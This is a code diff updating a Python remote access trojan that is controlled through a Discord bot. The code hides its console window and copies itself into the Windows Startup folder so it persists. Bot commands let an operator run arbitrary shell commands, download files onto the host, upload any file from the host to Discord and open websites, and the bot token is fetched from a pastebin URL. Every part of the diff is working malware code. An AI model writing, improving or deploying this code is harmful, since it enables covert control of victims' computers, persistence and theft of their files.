@@ -13,14 +13,12 @@ import re
 if getattr(sys, 'frozen', False):
     file_path = os.path.abspath(sys.executable)
     silent = 0x08000000
-    exe = True
 else:
     file_path = os.path.abspath(__file__)
     silent = 0
-    exe = False
 
 file_name = file_path.split("\\")[-1]
-copium_ver = 1.22
+copium_ver = 1.23
 whoami = subprocess.run("whoami", shell=True, capture_output=True, encoding='cp858', creationflags=silent).stdout.rstrip()
 client = commands.Bot(command_prefix='!', intents=discord.Intents.all(), help_command=None)
 current_login = None
@@ -30,11 +28,8 @@ def persistence():
     startup_folder_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
     if file_name not in os.listdir(startup_folder_path):
         subprocess.run(f"copy \"{file_path}\" \"{startup_folder_path}\"", shell=True, creationflags=silent)
-        subprocess.run(f"call \"{os.path.join(startup_folder_path, file_name)}\"", shell=True, creationflags=silent)
-        if exe:
-            sys.exit()
-        else:
-            quit()
+        subprocess.run(f"start \"\" \"{os.path.join(startup_folder_path, file_name)}\"", shell=True, creationflags=silent)
+        quit() if silent == 0 else sys.exit()
 
 
 def log_command(ctx, args=None, error=False):
@@ -90,13 +85,14 @@ async def download_command(ctx, url, filename=None):
         if not filename:
             await ctx.reply("You must specify a name or send a url with a name on it", ephemeral=True)
             return
-    await ctx.reply(f"Trying to download {filename}", ephemeral=True)
-    print(log_command(ctx, url + filename))
+    discord_formatted_path = "\\\\".join(filename.split("\\"))
+    await ctx.reply(f"Trying to download {discord_formatted_path}", ephemeral=True)
     r = requests.get(url)
     with open(filename, 'wb') as file:
         for chunk in r.iter_content(chunk_size=8192):
             if chunk:
                 file.write(chunk)
+    print(log_command(ctx, url+" "+filename))
 
 
 @client.hybrid_command(name="upload", with_app_command=True, description="uploads from the path to discord")
@@ -105,11 +101,7 @@ async def upload_command(ctx, path):
         return
 
     path = os.path.abspath(path)
-    byte_size = os.path.getsize(path)
-    if byte_size < 8000000:
-        await ctx.reply(file=discord.File(path), ephemeral=True)
-    else:
-        await ctx.reply(f"{os.path.basename(path)} is too big for discord: {byte_size} bytes", ephemeral=True)
+    await ctx.reply(file=discord.File(path), ephemeral=True)
     print(log_command(ctx, path))
 
 
@@ -165,12 +157,8 @@ async def cmd_command(ctx, *, command):
         else:
             with open("result.txt", "w") as f:
                 f.write(command_result)
-            await ctx.reply(f'Command result is {len(command_result)}, sending the result in a file',
-                            file=discord.File('result.txt'),
-                            ephemeral=True
-                            )
+            await ctx.reply(f'Command result is {len(command_result)}, sending the result in a file', file=discord.File('result.txt'), ephemeral=True)
             os.remove("result.txt")
-
     else:
         await ctx.reply("Command result is None", ephemeral=True)
     print(log_command(ctx, command))
@@ -184,12 +172,12 @@ async def site_command(ctx, site):
     if validators.url(site):
         await ctx.reply(f'Successfully started "{site}"', ephemeral=True)
         subprocess.run(f'start {site}', shell=True, creationflags=silent)
-        print(log_command(ctx, site))
     else:
         raise Exception(f'"{site}" is not a valid url')
+    print(log_command(ctx, site))
 
 
 if __name__ == '__main__':
-    persistence()
+    #persistence()
     TOKEN = requests.get("some pastebin raw url").content.decode()
     client.run(TOKEN, log_handler=None)
